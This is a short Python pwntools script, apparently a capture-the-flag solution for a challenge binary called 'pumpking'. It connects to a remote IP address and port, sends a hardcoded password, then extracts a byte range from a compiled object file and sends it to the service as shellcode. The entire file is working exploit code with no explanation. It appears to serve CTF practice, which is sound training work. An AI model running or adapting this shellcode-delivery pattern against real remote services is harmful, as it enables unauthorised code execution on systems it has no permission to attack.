from pwn import *

#p = gdb.debug("./pumpking", gdbscript='ni')
p = remote('167.71.138.188', 32371)

secret = b'pumpk1ngRulez'

with open('./sc.o', 'rb') as f:
    data = f.read()
sc = data[0x180:0x1f0]
print(sc)

print(p.recv())
p.sendline(secret)
print(p.recv())
p.sendline(sc)
print(p.recv())
